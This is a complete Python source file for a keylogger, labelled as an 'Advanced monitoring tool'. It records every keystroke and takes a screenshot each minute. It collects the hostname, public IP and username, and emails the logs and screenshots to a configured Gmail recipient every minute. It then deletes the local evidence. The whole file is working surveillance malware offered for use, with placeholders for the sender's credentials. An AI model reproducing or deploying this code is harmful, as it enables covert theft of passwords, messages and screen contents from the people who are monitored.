import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
import os
import time
import threading
import pyautogui
import datetime
import requests
import shutil

# Configuration
EMAIL_ADDRESS = "abc@gmail.com"  # Replace with your Gmail address
EMAIL_PASSWORD = "aaaa bbbb cccc dddd"  # Replace with your Google app password
SEND_TO = "xyz@gmail.com"  # Replace with recipient's email
BASE_DIR = os.path.join(os.path.expanduser("~"), "logs")  # Folder in user's home directory
KEYSTROKE_FILE = "keylog.txt"  # File to store keystrokes
SCREENSHOT_DIR = "screenshots"  # Directory to store screenshots
SEND_INTERVAL = 60  # Time interval in seconds (1 minute)
SCREENSHOT_INTERVAL = 60  # Time interval in seconds (1 minute)

# Create necessary directories
os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(os.path.join(BASE_DIR, SCREENSHOT_DIR), exist_ok=True)

KEYSTROKE_PATH = os.path.join(BASE_DIR, KEYSTROKE_FILE)

# Flags to track first email and data collection status
first_email_sent = threading.Event()
screenshot_ready = threading.Event()

# Lock to ensure thread safety when writing to keystroke file
keystroke_lock = threading.Lock()

def get_timestamp():
    """Get current timestamp in a readable format."""
    return datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def write_to_file(key):
    """Log keystrokes to a file with timestamp and active window info."""
    try:
        with keystroke_lock:
            letter = str(key)
            letter = letter.replace("'", "")

            if letter == 'Key.space':
                letter = ' '
            elif letter == 'Key.shift_r' or letter == 'Key.shift_l':
                letter = ''
            elif letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
                letter = ""
            elif letter == "Key.enter":
                letter = "\n"
            elif letter == "Key.backspace":
                letter = "[BKSP]"
            elif letter == "Key.tab":
                letter = "[TAB]"
            elif letter.startswith("Key."):
                letter = f"[{letter.replace('Key.', '').upper()}]"

            with open(KEYSTROKE_PATH, 'a') as f:
                f.write(letter)
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def take_screenshot():
    """Take a screenshot and save it to the screenshots directory."""
    try:
        timestamp = get_timestamp()
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(BASE_DIR, SCREENSHOT_DIR, filename)
        
        # Take screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)
        print(f"Screenshot saved: {filepath}")
        
        # Set the flag indicating screenshot is ready
        screenshot_ready.set()
            
        return filepath
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

def collect_system_info():
    """Collect basic system information."""
    import platform
    import socket
    
    info = {
        "system": platform.system(),
        "version": platform.version(),
        "machine": platform.machine(),
        "hostname": socket.gethostname(),
        "ip_address": get_public_ip(),
        "username": os.getlogin()
    }
    
    return info

def get_public_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=text", timeout=5)
        return response.text
    except Exception as e:
        print(f"Error getting public IP: {e}")
        return "Unknown"

def get_latest_file(directory):
    """Get the latest file from a directory based on modification time."""
    if not os.path.exists(directory) or not os.listdir(directory):
        return None, 0
    latest_file = max(os.listdir(directory), key=lambda f: os.path.getmtime(os.path.join(directory, f)))
    file_path = os.path.join(directory, latest_file)
    file_size = os.path.getsize(file_path)
    return latest_file, file_size

def create_report():
    """Create a report with system info and links to collected data."""
    system_info = collect_system_info()
    
    report = "SYSTEM INFORMATION:\n"
    for key, value in system_info.items():
        report += f"{key.upper()}: {value}\n"
    
    report += "\n\nFILES COLLECTED:\n"
    
    # Add keystroke log info
    if os.path.exists(KEYSTROKE_PATH) and os.path.getsize(KEYSTROKE_PATH) > 0:
        file_size = os.path.getsize(KEYSTROKE_PATH)
        report += f"Keystroke log: {KEYSTROKE_PATH} ({file_size} bytes)\n"
    
    # Add latest screenshot info
    screenshot_dir = os.path.join(BASE_DIR, SCREENSHOT_DIR)
    latest_screenshot, screenshot_size = get_latest_file(screenshot_dir)
    if latest_screenshot:
        report += f"\nLatest Screenshot:\n- {latest_screenshot} ({screenshot_size} bytes)\n"
    
    return report

def send_email_with_attachments():
    """Send an email with the collected data as attachments."""
    attachments = []
    
    # Check if this is the first email
    is_first_email = not first_email_sent.is_set()
    
    # For first email, only include latest screenshot
    if is_first_email:
        # Get the latest screenshot
        screenshot_dir = os.path.join(BASE_DIR, SCREENSHOT_DIR)
        if os.path.exists(screenshot_dir) and os.listdir(screenshot_dir):
            screenshots = sorted([os.path.join(screenshot_dir, f) for f in os.listdir(screenshot_dir)], 
                                key=os.path.getmtime, reverse=True)
            if screenshots:
                latest_screenshot = screenshots[0]
                attachments.append(latest_screenshot)
    else:
        # For subsequent emails, include latest screenshot and keystroke log
        
        # Attach keystroke log if it exists and has content
        if os.path.exists(KEYSTROKE_PATH) and os.path.getsize(KEYSTROKE_PATH) > 0:
            # Create a copy of the keystroke log to attach (to avoid file access conflicts)
            keystroke_copy = os.path.join(BASE_DIR, f"keylog_copy_{get_timestamp()}.txt")
            with keystroke_lock:
                shutil.copy2(KEYSTROKE_PATH, keystroke_copy)
            attachments.append(keystroke_copy)
        
        # Attach latest screenshot
        screenshot_dir = os.path.join(BASE_DIR, SCREENSHOT_DIR)
        if os.path.exists(screenshot_dir) and os.listdir(screenshot_dir):
            screenshots = sorted([os.path.join(screenshot_dir, f) for f in os.listdir(screenshot_dir)], 
                               key=os.path.getmtime, reverse=True)
            if screenshots:
                latest_screenshot = screenshots[0]
                attachments.append(latest_screenshot)
    
    # Create and send the email
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = SEND_TO
    msg["Subject"] = f"Monitoring Report - {get_timestamp()} - {'First Report' if is_first_email else 'Regular Report'}"

    # Add report to email body
    body = create_report()
    msg.attach(MIMEText(body, "plain"))

    # Attach files
    for file_path in attachments:
        try:
            if os.path.exists(file_path):
                with open(file_path, "rb") as file:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(file_path)}",
                )
                msg.attach(part)
                print(f"Attached file: {file_path}")
            else:
                print(f"Error: File '{file_path}' not found.")
        except Exception as e:
            print(f"Failed to attach file {file_path}: {e}")

    # Send the email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, SEND_TO, msg.as_string())
            print(f"Email sent successfully at {get_timestamp()}!")
            
            # Delete temporary keystroke copy if it exists
            if not is_first_email and os.path.exists(keystroke_copy):
                os.remove(keystroke_copy)
                
            # Mark first email as sent
            if is_first_email:
                first_email_sent.set()
            
            # Clean up after sending email (but only if it's not the first email)
            if not is_first_email:
                # Clear keystroke log
                with keystroke_lock:
                    open(KEYSTROKE_PATH, 'w').close()
                
                # Delete screenshots
                screenshot_dir = os.path.join(BASE_DIR, SCREENSHOT_DIR)
                for file in os.listdir(screenshot_dir):
                    os.remove(os.path.join(screenshot_dir, file))
                
                print("All collected data has been cleared after sending email")
                
            # Reset the ready flags
            screenshot_ready.clear()
            
    except Exception as e:
        print(f"Failed to send email: {e}")

def screenshot_thread_function():
    """Periodically take screenshots."""
    while True:
        try:
            take_screenshot()
            time.sleep(SCREENSHOT_INTERVAL)
        except Exception as e:
            print(f"Error in screenshot thread: {e}")
            time.sleep(SCREENSHOT_INTERVAL)

def email_thread_function():
    """Periodically send emails with collected data."""
    # Wait for the first screenshot to be ready before sending first email
    print("Waiting for first screenshot before sending email...")
    screenshot_ready.wait()
    print("First screenshot ready, preparing to send first email...")
    
    # Add a small delay to ensure screenshot is fully saved
    time.sleep(5)
    
    while True:
        try:
            # Send email with collected data
            send_email_with_attachments()
            
            # Wait before next email cycle
            time.sleep(SEND_INTERVAL)
        except Exception as e:
            print(f"Error in email thread: {e}")
            time.sleep(SEND_INTERVAL)

def start_keylogger():
    """Start the keylogger."""
    with Listener(on_press=write_to_file) as listener:
        listener.join()
    
if __name__ == "__main__":
    try:
        # Create an empty keylog file if it doesn't exist
        if not os.path.exists(KEYSTROKE_PATH):
            with open(KEYSTROKE_PATH, 'w') as f:
                pass
        
        # Start screenshot thread first to ensure we have a screenshot before sending email
        screenshot_thread = threading.Thread(target=screenshot_thread_function, daemon=True)
        screenshot_thread.start()
        
        email_thread = threading.Thread(target=email_thread_function, daemon=True)
        email_thread.start()
        
        print("Advanced monitoring tool is running...")
        print(f"Data will be stored in: {BASE_DIR}")
        
        # Start the keylogger (main thread)
        start_keylogger()
    except Exception as e:
        print(f"Error starting application: {e}")
